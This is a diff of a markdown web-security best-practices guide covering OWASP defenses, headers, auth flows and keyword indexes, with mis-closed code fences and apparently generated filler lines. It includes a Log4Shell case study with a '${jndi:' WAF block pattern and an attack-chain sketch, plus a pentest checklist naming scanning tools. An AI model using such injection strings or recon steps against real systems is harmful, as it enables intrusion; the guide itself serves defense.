@@ -1,10 +1,8 @@
 # SECURITY
 
-
 ## 05_SECURITY.MD: THE TITAN GUIDE (50K TARGET)
 
 > **?? Disclaimer**: This is educational content synthesized from industry best practices and publicly available documentation. Case studies are illustrative examples for teaching purposes. Last updated: December 2024.
-
 
 ## Production-Grade Authentication, Encryption, and OWASP
 
@@ -16,14 +14,11 @@
 
 ---
 
-
 ## ADVANCED SECURITY PATTERNS
 
 > **The patterns that protect applications**
 
-
 ## OWASP Top 10 Prevention
-
 
 ## 1. Injection
 
@@ -37,7 +32,6 @@ await db.query(query, [userId]);
 
 ```text
 
-
 ## 2. Broken Authentication
 
 - Use bcrypt with cost factor 12+
@@ -47,7 +41,6 @@ await db.query(query, [userId]);
 - Use secure session management
 
 - Require strong passwords
-
 
 ## 3. XSS Prevention
 
@@ -64,7 +57,6 @@ const clean = DOMPurify.sanitize(dirty);
 
 ```text
 
-
 ## 4. CSRF Protection
 
 ```typescript
@@ -80,9 +72,7 @@ throw new Error('CSRF validation failed');
 
 ---
 
-
 ## Security Headers
-
 
 ## Essential Headers
 
@@ -110,7 +100,6 @@ preload: true
 
 ---
 
-
 ## Helmet.js (Express)
 
 ```typescript
@@ -121,9 +110,7 @@ app.use(helmet());
 
 ---
 
-
 ## Password Security
-
 
 ## Hashing
 
@@ -138,7 +125,6 @@ const valid = await bcrypt.compare(password, hash);
 
 ```text
 
-
 ## Password Requirements
 
 - Minimum 12 characters
@@ -151,9 +137,7 @@ const valid = await bcrypt.compare(password, hash);
 
 ---
 
-
 ## API Security
-
 
 ## Rate Limiting
 
@@ -165,7 +149,6 @@ max: 100 // limit each IP to 100 requests
     });
 
 app.use('/api/', limiter);
-
 
 ## Input Validation
 
@@ -179,14 +162,11 @@ age: z.number().min(18).max(150)
 
 const validated = userSchema.parse(req.body);
 
-
 ## Secrets Management
-
 
 ## Environment Variables
 
 ```bash
-
 
 ## .env (never commit!)
 
@@ -194,7 +174,6 @@ DATABASE_URL=postgres://...
 JWT_SECRET=super-secret-key
 
 ```text
-
 
 ## Secret Rotation
 
@@ -206,9 +185,7 @@ JWT_SECRET=super-secret-key
 
 ---
 
-
 ## Audit Logging
-
 
 ## What to Log
 
@@ -251,7 +228,6 @@ SYSTEM:
 
 ---
 
-
 ## Log Format
 
 ```javascript
@@ -280,14 +256,11 @@ lockoutTriggered: false
 
 ---
 
-
 ## AUTHENTICATION DEEP DIVE
 
 > **The patterns for secure auth**
 
-
 ## JWT Best Practices
-
 
 ## Token Structure
 
@@ -301,7 +274,6 @@ Signature: HMACSHA256(header + "." + payload, secret)
 ```text
 
 ---
-
 
 ## Security Rules
 
@@ -335,7 +307,6 @@ Log environment variables
 
 ---
 
-
 ## OAuth 2.0 / OIDC
 
 - Authorization Code: server-side
@@ -348,7 +319,6 @@ Log environment variables
 
 - Refresh tokens: rotation, revocation
 
-
 ## Common Providers
 
 | Provider | Specialty |
@@ -358,7 +328,6 @@ Log environment variables
 | Supabase Auth | Part of Supabase |
 | Firebase Auth | Google ecosystem |
 
-
 ## Flows
 
 - Authorization Code + PKCE (SPAs, mobile)
@@ -366,7 +335,6 @@ Log environment variables
 - Client Credentials (server-to-server)
 
 ---
-
 
 ## Session Security
 
@@ -400,11 +368,9 @@ domain: '.example.com'
 
 ---
 
-
 ## INPUT VALIDATION 2
 
 > **The patterns for secure data handling**
-
 
 ## Validation Libraries
 
@@ -415,7 +381,6 @@ domain: '.example.com'
 | Joi | JavaScript | Node.js APIs |
 
 ---
-
 
 ## Zod Example
 
@@ -440,7 +405,6 @@ if (!result.success) {
 ```text
 
 ---
-
 
 ## Sanitization
 
@@ -490,7 +454,6 @@ const clean = DOMPurify.sanitize(dirty);
 
 > **The patterns for cross-origin requests**
 
-
 ## How CORS Works
 
 ```text
@@ -504,9 +467,7 @@ const clean = DOMPurify.sanitize(dirty);
 
 ---
 
-
 ## Simple vs Preflight
-
 
 ## Simple Request (no preflight)
 
@@ -515,7 +476,6 @@ const clean = DOMPurify.sanitize(dirty);
 - Standard headers only
 
 - Simple content types
-
 
 ## Preflight Request
 
@@ -529,9 +489,7 @@ const clean = DOMPurify.sanitize(dirty);
 
 ---
 
-
 ## Configuration
-
 
 ## Express
 
@@ -543,7 +501,6 @@ methods: ['GET', 'POST', 'PUT', 'DELETE'],
 credentials: true,
 maxAge: 86400
     }));
-
 
 ## Headers Explained
 
@@ -558,7 +515,6 @@ Access-Control-Max-Age: 86400
 
 ---
 
-
 ## Common Issues 2
 
 | Issue | Cause | Fix |
@@ -567,11 +523,9 @@ Access-Control-Max-Age: 86400
 | Credentials | Wildcard with credentials | Specify exact origin |
 | Preflight fails | OPTIONS not handled | Handle OPTIONS route |
 
-
 ## ENCRYPTION PATTERNS
 
 > **The patterns for protecting data**
-
 
 ## Encryption Types
 
@@ -583,7 +537,6 @@ Access-Control-Max-Age: 86400
 
 ---
 
-
 ## Hashing vs Encryption
 
 | | Hashing | Encryption |
@@ -593,7 +546,6 @@ Access-Control-Max-Age: 86400
 | Algorithm | bcrypt, argon2 | AES-256 |
 
 ---
-
 
 ## Password Hashing
 
@@ -636,7 +588,6 @@ const passwordSchema = z
 
 ---
 
-
 ## Never Do
 
 - Store plain text passwords
@@ -646,7 +597,6 @@ const passwordSchema = z
 - Create your own crypto
 
 ---
-
 
 ## Data Encryption
 
@@ -673,7 +623,6 @@ return { iv, encrypted, authTag };
 
 > **The patterns for secure APIs**
 
-
 ## Authentication
 
 - Password: hashing, Argon2, bcrypt
@@ -685,7 +634,6 @@ return { iv, encrypted, authTag };
 - Passwordless: magic links, passkeys
 
 - Biometrics: Face ID, Touch ID
-
 
 ## Authorization
 
@@ -699,7 +647,6 @@ return { iv, encrypted, authTag };
 
 ---
 
-
 ## Input Validation 3
 
 - [ ] Validate all inputs server-side
@@ -712,7 +659,6 @@ return { iv, encrypted, authTag };
 
 - [ ] Validate content types
 
-
 ## Rate Limiting 2
 
 - [ ] Limit requests per IP/user
@@ -722,7 +668,6 @@ return { iv, encrypted, authTag };
 - [ ] Return proper 429 responses
 
 - [ ] Include Retry-After header
-
 
 ## Headers
 
@@ -737,7 +682,6 @@ return { iv, encrypted, authTag };
 - Permissions-Policy: feature control
 
 ---
-
 
 ## Logging
 
@@ -755,7 +699,6 @@ return { iv, encrypted, authTag };
 
 > **The patterns for modern security**
 
-
 ## Core Principles
 
 - Never trust, always verify
@@ -767,7 +710,6 @@ return { iv, encrypted, authTag };
 - Least privilege access
 
 ---
-
 
 ## Implementation
 
@@ -795,23 +737,19 @@ return false;
 
 ---
 
-
 ## Everywhere Authentication
 
 Every request verified, not just perimeter
 
-
 ## Micro-segmentation
 
 Network divided into secure zones
-
 
 ## Continuous Verification
 
 Re-validate based on context changes
 
 ---
-
 
 ## Context Factors
 
@@ -826,7 +764,6 @@ Re-validate based on context changes
 - Resource sensitivity
 
 ---
-
 
 ## Technologies
 
@@ -843,7 +780,6 @@ Re-validate based on context changes
 
 > **The patterns for XSS prevention**
 
-
 ## CSP Header
 
     Content-Security-Policy:
@@ -853,7 +789,6 @@ style-src 'self' 'unsafe-inline';
 img-src 'self' data: https:;
 font-src 'self' <<<<<https://fonts.gstatic.com;>>>>>
 connect-src 'self' <<<<<https://api.example.com;>>>>>
-
 
 ## Directives Explained
 
@@ -867,7 +802,6 @@ connect-src 'self' <<<<<https://api.example.com;>>>>>
 | frame-src | iframe sources |
 
 ---
-
 
 ## Nonce Pattern
 
@@ -889,7 +823,6 @@ const nonce = crypto.randomBytes(16).toString('base64');
 
 > **The secure API key implementation**
 
-
 ## Key Generation
 
 ```javascript
@@ -905,7 +838,6 @@ return prefix + randomPart;
 ```text
 
 ---
-
 
 ## Secure Storage
 
@@ -931,7 +863,6 @@ return { apiKey, keyPrefix };
 
 ---
 
-
 ## Validation
 
 ```javascript
@@ -956,11 +887,10 @@ return apiKey;
 
 > **The correct OAuth implementation**
 
-
 ## Authorization Code Flow (Best for web apps)
 
 1. User clicks "Login with Google"
-1. Redirect to:
+2. Redirect to:
 
        <<<<<https://accounts.google.com/oauth/authorize>>>>>
        ?client_id=xxx
@@ -970,17 +900,16 @@ return apiKey;
        &state=random_csrf_token
 
 1. User logs in, consents
-1. Google redirects to:
+2. Google redirects to:
 
        <<<<<https://myapp.com/callback?code=xxx&state=xxx>>>>>
 
-1. Server exchanges code for tokens:
+3. Server exchanges code for tokens:
 
 POST <<<<<https://oauth2.googleapis.com/token>>>>>
 { code, client_id, client_secret, redirect_uri }
 
 1. Server receives: { access_token, refresh_token, id_token }
-
 
 ## PKCE Flow (Best for SPAs/Mobile)
 
@@ -1001,7 +930,6 @@ const challenge = crypto
 ```text
 
 ---
-
 
 ## Token Storage
 
@@ -1027,11 +955,9 @@ Any XSS can steal it.
 
 ---
 
-
 ## SUBDOMAIN TAKEOVER PREVENTION
 
 > **The DNS security patterns**
-
 
 ## How Takeover Happens
 
@@ -1054,26 +980,21 @@ VULNERABLE TO:
 
 ---
 
-
 ## Detection
 
 ```bash
-
 
 ## Check for dangling CNAMEs
 
 dig app.example.com CNAME
 
-
 ## If points to unclaimed resource
-
 
 ## NXDOMAIN or error page = potentially takeable
 
 ```text
 
 ---
-
 
 ## Prevention Checklist
 
@@ -1091,7 +1012,6 @@ dig app.example.com CNAME
 ## RATE LIMIT BYPASS PREVENTION
 
 > **The security patterns for rate limiting**
-
 
 ## Common Bypass Attempts
 
@@ -1116,7 +1036,6 @@ dig app.example.com CNAME
 
 ---
 
-
 ## Multi-Layer Limits
 
 ```python
@@ -1136,7 +1055,6 @@ LAYER 4: Endpoint-specific
 ```text
 
 ---
-
 
 ## Response Pattern
 
@@ -1158,7 +1076,6 @@ remaining: 0
 
 > **The patterns for safe file handling**
 
-
 ## Validation Checklist
 
 ```json
@@ -1173,7 +1090,6 @@ remaining: 0
 ```text
 
 ---
-
 
 ## Content-Type Validation
 
@@ -1196,7 +1112,6 @@ return type;
 
 ---
 
-
 ## Secure Filename
 
 ```javascript
@@ -1215,7 +1130,6 @@ return `${uuid()}_${cleaned}`;
 
 ---
 
-
 ## Storage Path
 
 ```yaml
@@ -1233,21 +1147,17 @@ const key = `uploads/${userId}/${uuid()}.${ext}`;
 
 > **The patterns for secure dependencies**
 
-
 ## npm audit
 
 npm audit
-
 
 ## Check vulnerabilities
 
 npm audit
 
-
 ## Auto-fix what's possible
 
 npm audit fix
-
 
 ## Force major updates (careful!)
 
@@ -1257,15 +1167,14 @@ npm audit fix --force
 
 ---
 
-
 ## Snyk Integration
 
 ```yaml
 
-
 ## GitHub Action
 
 - name: Snyk Security Scan
+
 uses: snyk/actions/node@master
   env:
 SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
@@ -1276,11 +1185,9 @@ args: --severity-threshold=high
 
 ---
 
-
 ## Automated Updates
 
 ```yaml
-
 
 ## Dependabot config
 
@@ -1302,7 +1209,6 @@ interval: weekly
 
 - "@types/*"
 - "*-types"
-
 
 ## Supply Chain Security
 
@@ -1331,7 +1237,6 @@ REGISTRY:
 
 > **The cross-site request forgery protection**
 
-
 ## Token Pattern
 
 // Generate token
@@ -1359,7 +1264,6 @@ return res.status(403).json({ error: 'Invalid CSRF token' });
       next();
     });
 
-
 ## SameSite Cookies
 
 ```javascript
@@ -1372,7 +1276,6 @@ sameSite: 'strict'  // Prevents CSRF
 ```text
 
 ---
-
 
 ## Double Submit Pattern
 
@@ -1390,7 +1293,6 @@ sameSite: 'strict'  // Prevents CSRF
 
 > **The cross-site scripting protection**
 
-
 ## Output Encoding
 
 ```javascript
@@ -1407,7 +1309,6 @@ element.innerHTML = encode(userInput);
 ```text
 
 ---
-
 
 ## React Protection
 
@@ -1428,7 +1329,6 @@ __html: DOMPurify.sanitize(userInput)
 
 ---
 
-
 ## Context-Specific Encoding
 
 ```html
@@ -1441,7 +1341,6 @@ CSS: special chars  ? CSS.escape()
 ```text
 
 ---
-
 
 ## CSP as Defense in Depth
 
@@ -1456,7 +1355,6 @@ script-src 'self';  // Block inline & external
 ## SECURE HEADERS CONFIGURATION
 
 > **The HTTP security headers**
-
 
 ## Essential Headers 2
 
@@ -1479,7 +1377,6 @@ preload: true
       }
     }));
 
-
 ## Header Reference
 
 | Header | Purpose |
@@ -1493,22 +1390,17 @@ preload: true
 
 ---
 
-
 ## Verification
 
 ```bash
-
 
 ## Check headers
 
 curl -I <<<<<https://example.com>>>>>
 
-
 ## Security scanner
 
-
 ## securityheaders.com
-
 
 ## observatory.mozilla.org
 
@@ -1516,9 +1408,7 @@ curl -I <<<<<https://example.com>>>>>
 
 ---
 
-
 ## 07_SECURITY.MD: THE TITAN GUIDE (25K TARGET)
-
 
 ## Production-Grade Zero Trust, Cryptography, and Pentesting
 
@@ -1529,63 +1419,60 @@ curl -I <<<<<https://example.com>>>>>
 
 ---
 
-
 ## **VOLUME 1: THE SCARS (The "Why")**
 
 *Real-world horror stories and billion-dollar failures.*
 
 1. The "Log4Shell" - The Internet on Fire (JNDI Injection)
-1. The "Equifax Breach" - Patch Management Failure
-1. The "SolarWinds Hack" - Supply Chain Attack
-1. The "Capital One Breach" - SSRF (Server Side Request Forgery)
-
+2. The "Equifax Breach" - Patch Management Failure
+3. The "SolarWinds Hack" - Supply Chain Attack
+4. The "Capital One Breach" - SSRF (Server Side Request Forgery)
 
 ## **VOLUME 2: THE FOUNDATION (The "What")**
 
 *Production-grade basics. No "Hello World".*
 
 1. Zero Trust Architecture (Never Trust, Always Verify)
-1. OAuth2 & OIDC (Authentication Flows Deep Dive)
-1. HTTPS & TLS 1.3 (Encryption in Transit)
-1. CORS & CSP (Browser Security Headers)
-
+2. OAuth2 & OIDC (Authentication Flows Deep Dive)
+3. HTTPS & TLS 1.3 (Encryption in Transit)
+4. CORS & CSP (Browser Security Headers)
 
 ## **VOLUME 3: THE DEEP DIVE (The "How")**
 
 *Advanced engineering and optimization.*
-9. JWT Security (Signing, Rotation, Revocation)
-10. WAF (Web Application Firewall) Rules & Bypass
-11. Rate Limiting & DDoS Protection (Layer 7)
-12. SQL Injection & XSS (The Classics)
 
+1. JWT Security (Signing, Rotation, Revocation)
+2. WAF (Web Application Firewall) Rules & Bypass
+3. Rate Limiting & DDoS Protection (Layer 7)
+4. SQL Injection & XSS (The Classics)
 
 ## **VOLUME 4: THE EXPERT (The "Scale")**
 
 *Distributed systems and high-scale patterns.*
-13. Secret Management (Vault/AWS Secrets Manager)
-14. Container Security (Distroless, Scanning, Runtime)
-15. Cloud Security Posture Management (CSPM)
 
+1. Secret Management (Vault/AWS Secrets Manager)
+2. Container Security (Distroless, Scanning, Runtime)
+3. Cloud Security Posture Management (CSPM)
 
 ## **VOLUME 5: THE TITAN (The "Kernel")**
 
 *Low-level internals and custom engines.*
-16. Memory Safety (Rust vs C++ Buffer Overflows)
-17. Side-Channel Attacks (Spectre/Meltdown Mitigation)
-18. Homomorphic Encryption (Compute on Encrypted Data)
 
+1. Memory Safety (Rust vs C++ Buffer Overflows)
+2. Side-Channel Attacks (Spectre/Meltdown Mitigation)
+3. Homomorphic Encryption (Compute on Encrypted Data)
 
 ## **VOLUME 6: THE INFINITE (The "Future")**
 
 *Experimental tech and "Meta-Beating" research.*
-19. Quantum-Safe Cryptography (Post-Quantum Algorithms)
-20. AI-Powered Threat Detection (Behavioral Analysis)
-21. Self-Sovereign Identity (DID & Verifiable Credentials)
+
+1. Quantum-Safe Cryptography (Post-Quantum Algorithms)
+2. AI-Powered Threat Detection (Behavioral Analysis)
+3. Self-Sovereign Identity (DID & Verifiable Credentials)
 
 ---
 
 ## VOLUME 1: THE SCARS (THE "WHY")
-
 
 ## 1. THE "LOG4SHELL" (CVE-2021-44228)
 
@@ -1602,12 +1489,12 @@ Server logs the User-Agent -> Fetches code from attacker -> RCE (Remote Code Exe
 **The Result**:
 Full control over millions of servers (iCloud, Minecraft, Twitter).
 **The Fix**:
+
 1. **Disable JNDI**: `log4j2.formatMsgNoLookups=true`.
 2. **WAF Rules**: Block `${jndi:`.
 3. **Patch**: Update to Log4j 2.17+.
 
 ---
-
 
 ## 4. THE "CAPITAL ONE BREACH"
 
@@ -1624,9 +1511,7 @@ Attacker used the credentials to sync 700 S3 buckets containing 100M credit card
 **The Fix**:
 **IMDSv2**. Require a session token for metadata access (blocks SSRF).
 
-
 ## VOLUME 2: THE FOUNDATION (THE "WHAT")
-
 
 ## 5. ZERO TRUST ARCHITECTURE
 
@@ -1636,19 +1521,21 @@ Attacker used the credentials to sync 700 S3 buckets containing 100M credit card
 Old Model: Castle & Moat. Once you VPN in, you have access to everything.
 Zero Trust: Assume the network is already compromised.
 **Principles**:
+
 1. **Verify Explicitly**: Authenticate every request, even internal ones.
 2. **Least Privilege**: Give only the access needed.
 3. **Assume Breach**: Design as if the attacker is inside.
 
 **Implementation (mTLS)**:
 Service A calls Service B.
+
 1. Service A presents a Client Certificate.
 2. Service B verifies it against the CA.
 3. Traffic is encrypted. Identity is verified.
+
 **Tools**: Istio, Linkerd, Consul Connect.
 
 ---
-
 
 ## 6. OAUTH2 & OIDC
 
@@ -1656,6 +1543,7 @@ Service A calls Service B.
 
 **Authorization Code Flow (PKCE)**:
 The standard for Mobile/SPA.
+
 1. **App**: Redirects user to `auth.com/authorize?code_challenge=xyz`.
 2. **User**: Logs in.
 3. **Auth Server**: Redirects back to `app.com/callback?code=123`.
@@ -1665,6 +1553,7 @@ The standard for Mobile/SPA.
 
 **Client Credentials Flow**:
 Machine-to-Machine (M2M).
+
 1. **Service**: Sends `client_id` + `client_secret`.
 2. **Auth Server**: Returns `access_token`.
 
@@ -1672,9 +1561,7 @@ Machine-to-Machine (M2M).
 
 ---
 
-
 ## VOLUME 3: THE DEEP DIVE (THE "HOW")
-
 
 ## 9. JWT SECURITY
 
@@ -1683,6 +1570,7 @@ Machine-to-Machine (M2M).
 **The Problem**:
 JWTs are stateless. If an attacker steals one, they are the user until it expires. You can't "logout" a JWT easily.
 **The Solution**:
+
 1. **Short Expiry**: Access Token expires in 15 minutes.
 2. **Refresh Token**: Long-lived (7 days), stored in HTTPOnly Cookie + DB.
 3. **Rotation**: When Refresh Token is used, issue a NEW Refresh Token and invalidate the old one.
@@ -1697,7 +1585,6 @@ JWTs are stateless. If an attacker steals one, they are the user until it expire
 - **Fix**: Explicitly whitelist algorithms (`RS256`).
 
 ---
-
 
 ## 10. WAF (WEB APPLICATION FIREWALL)
 
@@ -1723,9 +1610,7 @@ Inspects HTTP traffic at Layer 7.
 
 ---
 
-
 ## VOLUME 4: THE EXPERT (THE "SCALE")
-
 
 ## 13. SECRET MANAGEMENT
 
@@ -1751,7 +1636,6 @@ Inspects HTTP traffic at Layer 7.
 
 ---
 
-
 ## 14. CONTAINER SECURITY
 
 ### Distroless & Runtime Security
@@ -1772,9 +1656,7 @@ Detects abnormal behavior in containers.
 
 ---
 
-
 ## VOLUME 5: THE TITAN (THE "KERNEL")
-
 
 ## 16. MEMORY SAFETY
 
@@ -1797,7 +1679,6 @@ Attacker chains together small snippets of existing code (gadgets) to execute ar
 
 ---
 
-
 ## 18. HOMOMORPHIC ENCRYPTION
 
 ### Compute on Encrypted Data
@@ -1814,9 +1695,7 @@ Send encrypted medical data to the cloud. Cloud runs AI analysis. Cloud returns 
 
 ---
 
-
 ## VOLUME 6: THE INFINITE (THE "FUTURE")
-
 
 ## 19. QUANTUM-SAFE CRYPTOGRAPHY
 
@@ -1827,6 +1706,7 @@ Shor's Algorithm on a Quantum Computer can factor large integers efficiently.
 **RSA**and**Elliptic Curve (ECC)** will be broken.
 
 **NIST Finalists (The Replacements)**:
+
 1. **Kyber**(Key Encapsulation): Lattice-based.
 2. **Dilithium**(Digital Signatures): Lattice-based.
 3. **Sphincs+**: Hash-based.
@@ -1837,9 +1717,7 @@ Shor's Algorithm on a Quantum Computer can factor large integers efficiently.
 
 ---
 
-
 ## VOLUME 7: THE APPENDIX (TITAN REFERENCE)
-
 
 ## A. THE ULTIMATE SECURITY HEADERS
 
@@ -1855,7 +1733,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ```text
 
-
 ## B. THE PENTEST CHECKLIST
 
 1. **Recon**: Subdomain enumeration (Amass), Port scan (Nmap).
@@ -1866,14 +1743,11 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## KEYWORD REFERENCE INDEX
-
 
 ## Each line = 100x LLM expansion potential
 
 ---
-
 
 ## OWASP TOP 10 (2021)
 
@@ -1897,7 +1771,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - A10 SSRF: internal network access, cloud metadata
 
-
 ## AUTHENTICATION 2
 
 - Password hashing: bcrypt, scrypt, Argon2id
@@ -1912,7 +1785,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Passkeys: credential manager, cross-device
 
-
 ## AUTHORIZATION 2
 
 - RBAC: roles, permissions, inheritance
@@ -1926,7 +1798,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Least privilege: minimal access, regular audit
 
 - Zero trust: never trust, always verify
-
 
 ## WEB SECURITY
 
@@ -1944,7 +1815,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Trusted Types: DOM XSS mitigation
 
-
 ## CRYPTOGRAPHY
 
 - Symmetric: AES-256-GCM, ChaCha20-Poly1305
@@ -1961,7 +1831,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Post-quantum: Kyber, Dilithium, SPHINCS+
 
-
 ## APPLICATION SECURITY
 
 - SAST: static analysis, code scanning
@@ -1975,7 +1844,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Secret scanning: git history, pre-commit hooks
 
 - Fuzzing: AFL, libFuzzer, coverage-guided
-
 
 ## INFRASTRUCTURE SECURITY
 
@@ -1991,7 +1859,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Cloud security: CSPM, CWPP, CIEM
 
-
 ## THREAT MODELING
 
 - STRIDE: Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation
@@ -2003,7 +1870,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Data flow diagrams: trust boundaries, entry points
 
 - Kill chain: reconnaissance, weaponization, delivery, exploitation
-
 
 ## SECURITY OPERATIONS
 
@@ -2019,7 +1885,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Forensics: memory analysis, disk imaging, chain of custody
 
-
 ## PENETRATION TESTING
 
 - Reconnaissance: OSINT, subdomain enumeration
@@ -2034,17 +1899,13 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## END OF KEYWORD REFERENCE
 
 ---
 
-
 ## ADVANCED CRYPTOGRAPHY DEEP ATLAS
 
-
 ## Each keyword = expandable implementation
-
 
 ## Modern Ciphers
 
@@ -2058,7 +1919,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Key sizes: 128, 192, 256 bits
 
-
 ## Key Management
 
 - HSM: hardware security module
@@ -2071,7 +1931,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Envelope encryption: DEK, KEK
 
-
 ## Digital Signatures
 
 - RSA: 2048+, PSS padding
@@ -2083,7 +1942,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - JWT signing: RS256, ES256, EdDSA
 
 - Timestamps: RFC 3161, trusted
-
 
 ## Post-Quantum
 
@@ -2099,12 +1957,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## WEB SECURITY DEEP ATLAS
 
-
 ## Each keyword = expandable defense
-
 
 ## CSP Advanced
 
@@ -2118,7 +1973,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Trusted Types: DOM sink protection
 
-
 ## Cookie Security
 
 - HttpOnly: no JavaScript access
@@ -2130,7 +1984,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - **Host-: secure prefix
 
 - **Secure-: secure prefix
-
 
 ## CORS
 
@@ -2144,7 +1997,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Simple vs preflighted requests
 
-
 ## Headers 2
 
 - HSTS: Strict-Transport-Security
@@ -2157,12 +2009,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Permissions-Policy: feature control
 
-
 ## APPLICATION SECURITY DEEP ATLAS
 
-
 ## Each keyword = expandable technique
-
 
 ## SAST
 
@@ -2176,7 +2025,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Language-specific: ESLint, Bandit
 
-
 ## DAST
 
 - OWASP ZAP: proxy, active scan
@@ -2189,7 +2037,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - SQLMap: SQL injection
 
-
 ## IAST
 
 - Contrast Security: runtime
@@ -2201,7 +2048,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Continuous: real requests
 
 - Lower false positives
-
 
 ## SCA
 
@@ -2217,12 +2063,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## CLOUD SECURITY DEEP ATLAS
 
-
 ## Each keyword = expandable configuration
-
 
 ## IAM
 
@@ -2236,7 +2079,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Just-in-time: temporary elevation
 
-
 ## Network
 
 - VPC: private networking
@@ -2249,7 +2091,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - VPN: site-to-site, client
 
-
 ## Data
 
 - Encryption at rest: KMS, CMK
@@ -2261,7 +2102,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Key management: rotation
 
 - DLP: classification, prevention
-
 
 ## Compliance
 
@@ -2277,12 +2117,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## THREAT DETECTION DEEP ATLAS
 
-
 ## Each keyword = expandable capability
-
 
 ## SIEM
 
@@ -2296,7 +2133,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Correlation: rules, patterns
 
-
 ## EDR/XDR
 
 - CrowdStrike: Falcon platform
@@ -2308,7 +2144,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Carbon Black: VMware
 
 - Threat hunting: hypotheses
-
 
 ## Threat Intelligence
 
@@ -2328,12 +2163,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## ACCESS DEEP ATLAS
 
-
 ## Each keyword = expandable implementation 2
-
 
 ## Authentication 3
 
@@ -2347,7 +2179,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Biometrics: Face ID, Touch ID
 
-
 ## OAuth 2.0 / OIDC 2
 
 - Authorization Code: server-side
@@ -2360,7 +2191,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Refresh tokens: rotation, revocation
 
-
 ## Identity Providers
 
 - Auth0: managed, extensible
@@ -2372,7 +2202,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - AWS Cognito: serverless
 
 - Azure AD: Microsoft ecosystem
-
 
 ## Session Management
 
@@ -2388,12 +2217,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## NETWORK SECURITY DEEP ATLAS
 
-
 ## Each keyword = expandable control
-
 
 ## Perimeter Security
 
@@ -2407,7 +2233,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Reverse proxy: hiding origin
 
-
 ## Zero Trust
 
 - Never trust: always verify
@@ -2420,7 +2245,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Least privilege: minimal access
 
-
 ## Encryption in Transit
 
 - TLS 1.3: modern, fast
@@ -2432,7 +2256,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Perfect forward secrecy: ephemeral
 
 - HSTS: force HTTPS
-
 
 ## VPN & Remote Access
 
@@ -2448,12 +2271,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## INCIDENT RESPONSE DEEP ATLAS
 
-
 ## Each keyword = expandable process
-
 
 ## Preparation
 
@@ -2467,7 +2287,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Contact lists: escalation
 
-
 ## Detection & Analysis
 
 - Alert triage: severity
@@ -2480,7 +2299,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Scope: blast radius
 
-
 ## Containment
 
 - Network isolation: quarantine
@@ -2492,7 +2310,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - Backup verification: recovery
 
 - Preserve evidence: forensics
-
 
 ## Recovery & Lessons
 
@@ -2508,12 +2325,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## COMPLIANCE DEEP ATLAS
 
-
 ## Each keyword = expandable framework
-
 
 ## SOC 2
 
@@ -2527,7 +2341,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Auditor: independent
 
-
 ## ISO 27001
 
 - ISMS: management system
@@ -2540,7 +2353,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Continuous improvement
 
-
 ## GDPR
 
 - Lawful basis: consent, legitimate
@@ -2552,7 +2364,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 - DPO: data protection officer
 
 - Breach notification: 72 hours
-
 
 ## Industry-Specific
 
@@ -2568,12 +2379,9 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-
 ## SECURE SDLC DEEP ATLAS
 
-
 ## Each keyword = expandable practice
-
 
 ## Shift Left
 
@@ -2587,7 +2395,6 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 - Code review: security focus
 
-
 ## Build Security
 
 - SAST: static analysis
